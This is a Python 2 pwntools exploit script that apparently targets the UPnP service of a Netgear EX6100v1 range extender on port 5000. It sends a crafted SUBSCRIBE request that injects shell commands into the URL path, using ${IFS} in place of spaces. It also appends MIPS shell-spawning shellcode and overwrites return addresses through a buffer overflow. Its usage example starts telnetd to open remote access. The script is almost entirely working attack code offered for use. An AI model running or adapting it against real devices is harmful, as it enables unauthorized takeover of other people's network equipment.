#!/usr/bin/python2
from pwn import *
import sys

def help():
	print "Usage: python exp.py [ip] [command]"
	print "In EX6100v1 Available commands are:arp, ash, basename, brctl, cat, chmod, cp, dmesg, echo, expr, grep, halt, " \
		  "hostname, ifconfig, init, init, insmod, kill, killall,n, ls, lsmod, mdev, mkdir, mknod, mount, mv, ping, poweroff,"\
		  "ps, pwd, reboot, rm, rmdir, rmmod, route, sh, sleep, sync, telnetd,test, tftp, top, tr, umount, uptime, usleep, vconfig, wc" \
		  "\nExample : python exp.py 192.168.0.110 'telnetd${IFS}-p${IFS}23'"

def get_ip_commond():
	ip_command=[]
	try:
		ip=sys.argv[1]
		ip_command.append(ip)
		if ip=="-h" or ip=="--help" or ip=="help":
			help()
			exit()
			print("aaa")
		command=sys.argv[2].replace(" ","${IFS}")
		ip_command.append(command)
		if ip==None or command ==None:
			print "please input ip and Command"
			exit()
	except:
		exit()
	return ip_command


if __name__=="__main__":
	res=get_ip_commond()
	p=remote(res[0],5000)
	request = "SUBSCRIBE /gena.{command};?service=" .format(command=res[1])+ "1" + " HTTP/1.0\n"
	request += "Host: " + "192.168.1.0:" + "80" + "\n"
	request += "Callback: <http://192.168.0.4:34033/ServiceProxy27>\n"
	request += "NT: upnp:event\n"
	request += "Timeout: Second-1800\n"
	request += "Accept-Encoding: gzip, deflate\n"
	#request = 	request.ljust(0x1000,"a")
	print len(request)
	request += request+"doud"
	stg3_SC =''
	stg3_SC += "\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
	stg3_SC += "\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
	stg3_SC += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
	stg3_SC += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
	stg3_SC += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
	stg3_SC += "\xab\x0f\x02\x24\x0c\x09\x09\x01"
	#payload+= "d"*0x18
	request += request+stg3_SC
	request = request.ljust(0x1f00,"a")
	request += p32(0x7fff7030)
	request = request.ljust(0x1f48-0x14,"a")
	request += p32(0x422848)
	#request += p32(0x422944)
	#request += "a"*0x500
	#request += p32(0x7fff7030)*8
	p.send(request)